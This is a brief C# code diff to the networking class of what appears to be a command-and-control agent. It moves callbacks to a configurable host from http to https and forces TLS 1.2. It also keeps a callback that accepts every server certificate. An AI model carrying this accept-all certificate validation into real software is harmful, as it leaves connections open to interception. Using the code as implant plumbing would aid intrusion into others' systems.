@@ -25,10 +25,13 @@ namespace Agent.Models
             ConnectAddress=connectAddress;
             ConnectPort=connectPort;
 
+            ServicePointManager.Expect100Continue = true;
+            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
             ServicePointManager.ServerCertificateValidationCallback = new
             RemoteCertificateValidationCallback
             (
-               delegate { return true; }
+               delegate { 
+                   return true; }
             );
         }
 
@@ -39,7 +42,8 @@ namespace Agent.Models
 
             _client = new HttpClient();
             _client.Timeout = new TimeSpan(0, 0, 10);
-            _client.BaseAddress = new Uri($"http://{this.ConnectAddress}:{this.ConnectPort}");
+            _client.BaseAddress = new Uri($"https://{this.ConnectAddress}:{this.ConnectPort}");
+            Console.WriteLine(_client.BaseAddress);
             _client.DefaultRequestHeaders.Clear();
 
             var encodedMetadata = Convert.ToBase64String(metadata.Serialize());
